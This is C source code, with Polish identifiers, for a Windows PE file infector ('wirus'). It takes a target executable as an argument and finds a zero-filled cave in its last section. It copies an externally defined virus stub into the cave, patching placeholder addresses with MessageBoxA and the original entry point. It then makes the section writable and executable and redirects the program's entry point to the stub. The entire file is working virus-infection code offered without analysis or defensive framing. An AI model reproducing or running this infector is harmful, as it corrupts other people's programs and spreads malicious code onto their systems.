#include <stdio.h>
#include <windows.h>

#define ADRES 0xAAAAAAAA

extern VOID wirus_poczatek(VOID);
extern VOID wirus_koniec(VOID);

PIMAGE_NT_HEADERS GetPeHeader(const LPBYTE lpbMViewOfFile)
{
  const PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)lpbMViewOfFile;
  return (PIMAGE_NT_HEADERS)((DWORD)pImageDOSHeader + pImageDOSHeader -> e_lfanew);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(const LPBYTE lpbMViewOfFile)
{
  return (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(GetPeHeader(lpbMViewOfFile)) + 
    (GetPeHeader(lpbMViewOfFile) -> FileHeader.NumberOfSections - 1));
}

BOOL plik_potwierdz(const LPBYTE lpbMViewOfFile)
{
  return (
    (IMAGE_DOS_SIGNATURE == ((PIMAGE_DOS_HEADER)lpbMViewOfFile) -> e_magic) || 
    (IMAGE_NT_SIGNATURE == GetPeHeader(lpbMViewOfFile) -> Signature)
  );
}

int main(const int argc, const char *argv[])
{
  if(2 > argc)
  {
    fprintf(stderr, "Sposób u¿ycia %s <PLIK_DO_ZARAZENIA>\n>", argv[0]);
    return 1;
  }
  
  const HANDLE hFile = CreateFile(argv[1], GENERIC_READ | GENERIC_WRITE, 0, 
    NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  const DWORD dwFileSize = GetFileSize(hFile, NULL);
  const HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 
    dwFileSize, NULL);
  const LPBYTE lpbMViewOfFile = (LPBYTE)MapViewOfFile(hFileMapping, FILE_MAP_READ | 
    FILE_MAP_WRITE, 0, 0, dwFileSize);
  
  if(FALSE == plik_potwierdz(lpbMViewOfFile))
  {
    fprintf(stderr, "Niepoprawny plik PE\n");
    return 0;
  }
  
  const PIMAGE_NT_HEADERS pImageNTHeaders = GetPeHeader(lpbMViewOfFile);
  const PIMAGE_SECTION_HEADER pImageSectionHeader = 
    GetLastSectionHeader(lpbMViewOfFile);
  
  const DWORD dwAOfEntryPoint = pImageNTHeaders -> OptionalHeader
    .AddressOfEntryPoint + pImageNTHeaders -> OptionalHeader.ImageBase;
  const DWORD dwWirusDlugosc = (DWORD)wirus_koniec - (DWORD)wirus_poczatek;
  
  DWORD dwMiejsceDlugosc = 0;
  DWORD dwMiejscePoczatek = 0;
  for(dwMiejscePoczatek = pImageSectionHeader -> PointerToRawData; 
    dwMiejscePoczatek < dwFileSize; ++dwMiejscePoczatek)
  {
    if(0x00 == *(lpbMViewOfFile + dwMiejscePoczatek))
    {
      ++dwMiejsceDlugosc;
      if(dwMiejsceDlugosc == dwWirusDlugosc)
      {
        dwMiejscePoczatek = dwMiejscePoczatek - dwWirusDlugosc;
        break;
      }
    }
    else
    {
      dwMiejsceDlugosc = 0;
    }
  }
  if(
    (0 == dwMiejsceDlugosc) || 
    (0 == dwMiejscePoczatek)
  )
  {
    return 1;
  }
  
  const HMODULE hLibraryUser32 = LoadLibrary("user32.dll");
  const LPVOID lpvPAddressMessageBoxA = GetProcAddress(hLibraryUser32, "MessageBoxA");
  
  const HANDLE hHeap = HeapCreate(0, 0, dwWirusDlugosc);
  const LPVOID lpvHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwWirusDlugosc);
  memcpy(lpvHeap, wirus_poczatek, dwWirusDlugosc);
  
  DWORD dwIterator = 0;
  for(; dwIterator < dwWirusDlugosc; ++dwIterator)
  {
    if(ADRES == *((LPDWORD)lpvHeap + dwIterator))
    {
      *((LPDWORD)lpvHeap + dwIterator) = (DWORD)lpvPAddressMessageBoxA;
      FreeLibrary(hLibraryUser32);
      break;
    }
  }
  for(; dwIterator < dwWirusDlugosc; ++dwIterator)
  {
    if(ADRES == *((LPDWORD)lpvHeap + dwIterator))
    {
      *((LPDWORD)lpvHeap + dwIterator) = dwAOfEntryPoint;
      break;
    }
  }
  
  memcpy((LPBYTE)(lpbMViewOfFile + dwMiejscePoczatek), lpvHeap, dwWirusDlugosc);
  HeapFree(hHeap, 0, lpvHeap);
  HeapDestroy(hHeap);
  
  pImageSectionHeader -> Misc.VirtualSize += dwWirusDlugosc;
  pImageSectionHeader -> Characteristics |= IMAGE_SCN_MEM_WRITE | 
    IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
  pImageNTHeaders -> OptionalHeader.AddressOfEntryPoint = dwMiejscePoczatek + 
    pImageSectionHeader -> VirtualAddress - 
    pImageSectionHeader -> PointerToRawData;
  
  return 0;
}
